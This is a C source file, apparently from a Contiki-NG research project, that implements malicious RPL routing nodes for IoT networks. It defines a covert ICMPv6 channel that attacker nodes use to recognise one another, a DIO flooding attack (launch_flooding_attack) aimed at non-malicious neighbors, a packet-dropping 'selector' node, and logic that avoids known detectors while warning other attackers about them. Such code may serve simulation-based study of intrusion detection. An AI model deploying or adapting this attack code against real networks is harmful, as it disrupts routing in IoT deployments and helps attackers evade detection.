#include "net/routing/rpl-lite/rpl-icmp6-malicious.h"
#define LOG_MODULE "RPL"
#define LOG_LEVEL LOG_LEVEL_INFO

/* Initialize RPL ICMPv6 Flooding message handler */
UIP_ICMP6_HANDLER(flood_handler, ICMP6_RPL, RPL_CODE_FLOOD, flood_input);
/* Init the flood handler */
void rpl_icmp6_flood_init(){
    uip_icmp6_register_input_handler(&flood_handler);
}

/* Initialize flood node stats & neighbors array */
void init_flood(){
    flood = true;
    flooding = false;
    init_neighbors_array();
    dio_sent_flood = 0;
}

/* Initialize selector node stats */
void init_select(){
    select = true;
    selecting = false;
    icmp_total = icmp_dropped = packets_dropped = 0;
    init_pair_array();
    init_malicious_array_selector();
}

/* Initiliaze the information of the neighbors array */
void init_neighbors_array(){
    uint8_t i;
    for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i){
        neighbors[i].malicious = neighbors[i].used = neighbors[i].detector = false;
    }
}

void init_pair_array(){
  pairs[0].message = RPL_CODE_DIS; pairs[0].length = DIS_length;
  pairs[1].message = RPL_CODE_DIO; pairs[1].length = DIO_length;
  pairs[2].message = RPL_CODE_DAO; pairs[2].length = DAO_length;
  pairs[3].message = RPL_CODE_DAO_ACK; pairs[3].length = DAO_ACK_length;
}
void init_malicious_array_selector(){
  uint8_t i;
  for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i){
      neighbors[i].used = neighbors[i].malicious = false;
  }
}

/* Main input fuction for RPL Flood ICMPv6 messages */
void flood_input(){
 /* Only necessary for flood and select attacker nodes*/
  if (flood || select) {
  }
  else goto clear;
  /* print who was the sender */
  char buf[21];
  uiplib_ipaddr_snprint(buf, sizeof(buf), &UIP_IP_BUF->srcipaddr);
  printf("Received malicious icmp6 from: %s\n", buf);
  unsigned char *buffer;
  char message[7];
  buffer = UIP_ICMP_PAYLOAD;
  memcpy(message,buffer,7);
  if(!strcmp(message,"floods") || !strcmp(message,"select")) { //message correct from flood or selector node
    /* Indicate in the neighbors array that the sender is a malicious node */
    if (flood){
      uint8_t i;
      for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
	  if (neighbors[i].used) {
	      if (compare_ip_address(&neighbors[i].ipaddr, &UIP_IP_BUF->srcipaddr)){
		  neighbors[i].malicious = true;
		  goto clear;
	      }
	  }
      }
    }
    else{
      uint8_t i;
      for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
 	 if (neighbors[i].used && compare_ip_address(&neighbors[i].ipaddr, &UIP_IP_BUF->srcipaddr)) goto clear;
            // IP address not stored - store it and set it as used //
         else if (!neighbors[i].used) {
           uip_ipaddr_copy(&neighbors[i].ipaddr,&UIP_IP_BUF->srcipaddr);
	   neighbors[i].used = true;
	   neighbors[i].malicious = true;
           goto clear;
         }   
      }
    }
  }
  else if (!strcmp(message,"warned") && flood){
    uip_ipaddr_t detector;
    memcpy(&detector, buffer + 7, 16);
    remove_detector_from_flood(&detector);
    uip_ipaddr_t sender;
    uip_ipaddr_copy(&sender,&UIP_IP_BUF->srcipaddr);
    warn_detector_flooding(&detector,&sender);
  }
  else printf("Unknown message received - avoided\n"); //message incorrect
  goto clear;
  clear:
    uipbuf_clear(); //clear the buff to avoid possible errors
}

/* RPL ICMP6 Flood message output function. Send the RPL message 
 * 1st param: Destination IP address
 * 2nd param: Message Payload
 * 3rd param: Payload length
*/
void
rpl_icmp6_malicious_output(uip_ipaddr_t *dest, const void *data, uint16_t datalen, bool detector_warning, uip_ipaddr_t *detector)
{
  /* Make sure we're up-to-date before sending data out */
  rpl_dag_update_state();
  /* Unicast or multicast */
  dest = dest != NULL ? dest : &rpl_multicast_addr;
  /* Get the Payload */
  unsigned char *buffer;
  buffer = UIP_ICMP_PAYLOAD;
  memcpy(buffer, data, 7);
  if (detector_warning){
    memcpy(buffer + 7, detector, 16);
  }
  /* Print the destination IP address*/
  char buff[21];
  uiplib_ipaddr_snprint(buff, sizeof(buff), dest);
  printf("Sending a malicious message to: %s\n", buff);
  /* Send the RPL ICMPv6 message */
  uip_icmp6_send(dest, ICMP6_RPL, RPL_CODE_FLOOD, datalen);
}

/* Used to call the main Output function above. */
void malicious_output(uint8_t type){
  /* clear the buff to avoid possible errors */
  uipbuf_clear();
  char message[7];
  if (type == 0) { //flooding node
      strcpy(message,"floods"); //message to be sent
  }
  else { //type = 1 --> selector node
      strcpy(message,"select"); //message to be sent
  }
  /* Send the message. 1st Param = NULL indicates multicast destination */
  rpl_icmp6_malicious_output(NULL, &message, sizeof(message),false,NULL);
}
void warn_detector_flooding(uip_ipaddr_t *detector, uip_ipaddr_t *sender){
  uint8_t i;
  for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
    if (neighbors[i].used && neighbors[i].malicious && !compare_ip_address(&neighbors[i].ipaddr, sender)){
      //clear the buff to avoid possible errors
      uipbuf_clear();
      char message[7];
      strcpy(message,"warned");
      rpl_icmp6_malicious_output(&neighbors[i].ipaddr, &message, sizeof(message)+16, true, detector);
    }
  }
}

void remove_detector_from_flood(uip_ipaddr_t *detector) {
  if (flood){
    uint8_t i;
    for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
	if (neighbors[i].used && compare_ip_address(&neighbors[i].ipaddr, detector)) {
	  neighbors[i].detector = true;
	  return;
	}
    }
  }
}
/* Add the neighbors to the neighbors array */
void add_all_nodes(){
    if (flood) {
        uip_ipaddr_t root_ip;
        rpl_dag_get_root_ipaddr(&root_ip);
        if (compare_ip_address(&root_ip, &UIP_IP_BUF->srcipaddr)) return;
        uint8_t i;
        for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
            /* IP address already stored*/
            if (neighbors[i].used && compare_ip_address(&neighbors[i].ipaddr, &UIP_IP_BUF->srcipaddr)) return;
            /* IP address not stored - store it and set it as used */
            else if (!neighbors[i].used) {
                uip_ipaddr_copy(&neighbors[i].ipaddr,&UIP_IP_BUF->srcipaddr);
                neighbors[i].used = true;
                return;
            }   
        }
    }
}

/* Launch the DIO Flood attack */
void launch_flooding_attack(){
      uint8_t i;
      uip_ipaddr_t root_ip;
      rpl_dag_get_root_ipaddr(&root_ip);
      for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
            if (neighbors[i].used) {
                /* If is not malicious and is not the root --> flood */
                if (!neighbors[i].malicious && /*!compare_ip_address(&root_ip, &neighbors[i].ipaddr) && */!neighbors[i].detector) {
		    rpl_icmp6_dio_output(&neighbors[i].ipaddr);
		    char buf[21];
		    uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
		    printf("sending DIO %d to %s\n",i,buf);
		    ++dio_sent_flood;
                }
                else{
                    char buf[21];
                    uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
                    printf("NOT sending DIO %d to %s\n",i,buf);
                }
            }
            else return;
     }     
}

/* Check if the IP address of the 1st param is malicious */
bool check_malicious_ip(uip_ipaddr_t *ip){
    uint8_t i;
    for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
                if (neighbors[i].used && compare_ip_address(ip, &neighbors[i].ipaddr) && neighbors[i].malicious) return true;
    }
    return false;
}
/* Compare the ip addresses without prefix - without local vs global addresses */
bool compare_ip_address(uip_ipaddr_t *ip1, uip_ipaddr_t *ip2) {
  uint8_t i;
  for(i=2;i<8;++i){
    if ((ip1)->u16[i] != (ip2)->u16[i]) return false;
  }
  return true;
}
bool check_suspicious_length(uint8_t type, uint8_t icode){
    uint8_t i;
    // Discard messages with different length of the original RPL messages 
    for(i=0; i<(uint8_t)( sizeof(pairs) / sizeof(pairs[0])); ++i){
      if (type == ICMP6_RPL && icode == pairs[i].message) {
	if ((pairs[i].message == RPL_CODE_DIO && (uip_len < pairs[i].length || uip_len > pairs[i].length+41)) || uip_len != pairs[i].length){
	  ++icmp_dropped;
	  return true;
	}
      }
    }
    return false;
}
/* Start selecting packets */
void start_filtering(){
    selecting = true;
}

/* Start Hello flood attack */
void start_flooding(){
    flooding = true;
}
